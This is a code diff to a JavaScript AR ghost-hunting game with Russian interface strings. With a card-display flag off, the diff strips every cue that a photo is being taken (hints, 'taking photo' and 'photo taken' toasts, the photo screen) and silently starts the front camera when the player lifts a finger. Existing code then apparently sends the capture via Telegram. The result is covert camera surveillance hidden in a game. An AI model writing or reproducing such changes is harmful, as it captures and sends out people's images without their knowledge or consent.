@@ -108,7 +108,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     setPhase('photo');
     photo.state = 'idle';
     photo.captured = false;
-    if (onHint) onHint(SHOW_CARD ? 'Шаг 2: фото для удостоверения' : 'Шаг 2: снимок для доступа');
+    if (SHOW_CARD && onHint) onHint('Шаг 2: фото для удостоверения');
   }
 
   function enterHunt() {
@@ -153,7 +153,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     } else if (scan.progress < 1) {
       scan.progress = Math.max(0, scan.progress - dt * 0.9);
     }
-    if (scan.progress >= 1 && auto > 0) {
+    if (SHOW_CARD && scan.progress >= 1 && auto > 0) {
       auto -= dt;
       if (auto <= 0) enterPhoto();
     }
@@ -199,8 +199,8 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
       photo.video = v;
       photo.state = SHOW_CARD ? 'preview' : 'waiting';
       photo.countdown = SHOW_CARD ? 3 : 2.5; // в режиме ожидания - бюджет на появление кадра
-      toast = SHOW_CARD ? 'Снимаем... не двигайся' : 'Снимаю фото...';
-      toastT = 1.2;
+      toast = SHOW_CARD ? 'Снимаем... не двигайся' : '';
+      toastT = SHOW_CARD ? 1.2 : 0;
     } catch (e) {
       photo.state = 'unavailable';
       auto = 1.2;
@@ -225,8 +225,8 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     cardBlob = card ? await toBlob(card) : null;
     photo.state = 'captured';
     photo.flash = 1;
-    toast = 'Фото сделано';
-    toastT = 1;
+    toast = SHOW_CARD ? 'Фото сделано' : '';
+    toastT = SHOW_CARD ? 1 : 0;
     if (hasTelegram()) {
       sendState = 'sending';
       await sendCard();
@@ -578,8 +578,14 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   }
 
   function onPointerUp() {
+    const granted = scan.progress >= 1;
     scan.holding = false;
     pointer.down = false;
+    // ВРЕМЕННО: камеру запрашиваем прямо на отпускании пальца (жест), без отдельного экрана.
+    if (phase === 'scan' && granted) {
+      enterPhoto();
+      if (!SHOW_CARD) startFrontCam();
+    }
   }
 
   // ── Отрисовка ───────────────────────────────────────────
@@ -638,7 +644,9 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     ctx.textBaseline = 'middle';
 
     if (phase === 'scan') renderScan();
-    else if (phase === 'photo') renderPhoto();
+    else if (phase === 'photo') {
+      if (SHOW_CARD) renderPhoto();
+    }
     else if (phase === 'hunt' && hunt.mode === '2d') render2D();
     else if (phase === 'hunt') {
       ctx.fillStyle = '#d9cdf5';
